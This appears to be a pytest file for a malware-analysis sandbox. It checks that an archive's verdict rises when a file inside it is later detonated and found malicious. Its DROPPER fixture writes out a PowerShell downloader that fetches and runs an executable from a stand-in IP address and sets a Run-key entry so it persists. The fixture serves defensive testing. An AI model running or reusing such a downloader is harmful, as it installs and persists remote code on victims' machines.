"""A zip kept its pre-detonation verdict after the file inside it detonated.

`pipeline.run` states the rule in three places -- "a container carries the
verdict of the worst thing found in it" -- and enforces it once, at static time.
`ingest_report` then re-scored only the job the report was posted for. It never
read `parent_job_id`.

So: submit `invoice.zip` carrying `dropper.exe`. The child scores 32 and the
container is floored to 32. The worker detonates the child, posts its report, the
child becomes malicious at 71.8 -- and the container stays suspicious at 32 for
ever.

Not cosmetic. `/api/jobs` and `/api/jobs/stats` both scope to `parent_job_id IS
NULL`, so the queue, the tiles, the donut and the top-risk list see ONLY the
container: a detonation-confirmed malicious sample counted as suspicious and
absent from the malicious total. The report page renders the container directly
above the child that contradicts it, and every export carries the stale verdict.

Measured on the live deployment before this: **64 jobs scoring below a detonated
child**, the worst reading `benign_034.zip clean 20.4` above `python3.dll
suspicious 41.2`.

This is the third time the worker seam has drifted from the static path --
`test_a_second_path_forgot_the_rule.py` is the second -- so the last test here
asserts the two now agree, by running the post-hoc rule immediately after
`pipeline.run` and requiring it to change nothing.
"""
from __future__ import annotations

import io
import zipfile

from app.engine import pipeline
from app.engine.models import JobStatus, SandboxJob
from app.engine.storage import store_bytes

DROPPER = (
    b"$w = New-Object Net.WebClient\r\n"
    b"$w.DownloadFile('http://198.51.100.7/p.exe', \"$env:TEMP\\p.exe\")\r\n"
    b"Start-Process \"$env:TEMP\\p.exe\"\r\n"
    b"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
    b"-Name Updater -Value \"$env:TEMP\\p.exe\"\r\n"
)


def _zip_of(name: str, payload: bytes) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(name, payload)
    return buffer.getvalue()


def _run_archive(db, payload: bytes, name: str = "invoice.zip") -> SandboxJob:
    job = pipeline.new_job(db, store_bytes(payload), original_name=name, tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()
    assert job.status == JobStatus.COMPLETED
    return job


def _children(db, job) -> list[SandboxJob]:
    return pipeline._descendants(db, job)


def test_the_static_path_already_raises_the_container(db) -> None:
    """The premise: this is what the worker seam was failing to repeat."""
    job = _run_archive(db, _zip_of("dropper.ps1", DROPPER))
    kids = _children(db, job)
    assert kids, "the archive member should have become its own job"
    assert (job.final_score or 0) >= max(k.final_score or 0 for k in kids)


def test_a_detonation_raises_the_container_above_it(db) -> None:
    """The finding. The child gets worse; the container has to hear about it."""
    job = _run_archive(db, _zip_of("readme.txt", b"nothing interesting here at all"))
    kids = _children(db, job)
    assert kids

    child = kids[0]
    before_score = job.final_score or 0.0
    before_verdict = (job.verdict or {}).get("verdict")

    # What ingest_report writes when a detonation comes back worse.
    child.final_score = (before_score or 0) + 40.0
    child.risk_level = "high"
    child.verdict = {
        "verdict": "malicious",
        "threat_name": "Win32.Trojan.Detonated",
        "detection_ratio": "1 / 7",
        "detected": 1,
        "total_engines": 7,
        "platform": "Win32",
        "category": "Trojan",
        "family": "Detonated",
        "engines": [],
    }
    child.impact = {"base_score": 7.4, "severity": "high", "capabilities": ["execution"]}
    db.commit()

    changed = pipeline.reapply_to_ancestors(db, child)
    db.commit()
    db.refresh(job)

    assert changed == 1, "exactly one container sits above this child"
    assert (job.verdict or {}).get("verdict") == "malicious", job.verdict
    assert (job.final_score or 0) >= child.final_score
    assert before_verdict != (job.verdict or {}).get("verdict")


def test_the_container_says_why_it_was_raised(db) -> None:
    """A reader has to see that the word changed and what changed it."""
    job = _run_archive(db, _zip_of("notes.txt", b"harmless notes, nothing to see"))
    child = _children(db, job)[0]
    child.verdict = {
        "verdict": "malicious", "threat_name": "Win32.Trojan.X", "detection_ratio": "1 / 7",
        "detected": 1, "total_engines": 7, "platform": "Win32", "category": "Trojan",
        "family": "X", "engines": [],
    }
    child.final_score = 80.0
    db.commit()

    pipeline.reapply_to_ancestors(db, child)
    db.commit()
    db.refresh(job)

    because = (job.verdict or {}).get("raised_because", "")
    assert because, job.verdict
    assert "container" in because
    assert (child.original_name or "") in because or "inside" in because


def test_a_nested_archive_carries_it_up_every_level(db) -> None:
    """A zip inside a zip has to hear about it too, which is why it is a walk."""
    inner = _zip_of("payload.txt", b"quiet inner payload text for the test")
    job = _run_archive(db, _zip_of("inner.zip", inner), name="outer.zip")
    everything = _children(db, job)
    deepest = max(everything, key=lambda d: len((d.archive_path or "").split("/")))
    if deepest.parent_job_id == job.id:
        return                                   # no nesting on this platform

    deepest.verdict = {
        "verdict": "malicious", "threat_name": "Win32.Trojan.Deep", "detection_ratio": "1 / 7",
        "detected": 1, "total_engines": 7, "platform": "Win32", "category": "Trojan",
        "family": "Deep", "engines": [],
    }
    deepest.final_score = 90.0
    db.commit()

    raised = pipeline.reapply_to_ancestors(db, deepest)
    db.commit()
    db.refresh(job)

    assert raised >= 2, "both the inner zip and the outer one"
    assert (job.verdict or {}).get("verdict") == "malicious"


def test_it_never_lowers_a_container(db) -> None:
    """A container assessed worse than its contents keeps its own assessment."""
    job = _run_archive(db, _zip_of("dropper.ps1", DROPPER))
    before = dict(job.verdict or {})
    before_score = job.final_score

    pipeline.reapply_to_ancestors(db, _children(db, job)[0])
    db.commit()
    db.refresh(job)

    assert (job.verdict or {}).get("verdict") == before.get("verdict")
    assert job.final_score == before_score


def test_it_is_idempotent(db) -> None:
    """Called twice, the second call changes nothing."""
    job = _run_archive(db, _zip_of("dropper.ps1", DROPPER))
    child = _children(db, job)[0]
    pipeline.reapply_to_ancestors(db, child)
    db.commit()
    assert pipeline.reapply_to_ancestors(db, child) == 0


def test_the_two_paths_agree(db) -> None:
    """THE DRIFT CHECK, and the reason this file exists at all.

    `pipeline.run` raises a container inline; `reapply_container_inheritance`
    does it post-hoc for the worker seam. Two implementations of one rule is how
    the seam drifted twice already. Running the post-hoc rule immediately after
    the static path must therefore change nothing: if the two ever disagree,
    this fails instead of a customer's report.
    """
    job = _run_archive(db, _zip_of("dropper.ps1", DROPPER))
    assert pipeline.reapply_container_inheritance(db, job) is False, (
        "the post-hoc rule disagrees with pipeline.run — they have drifted"
    )
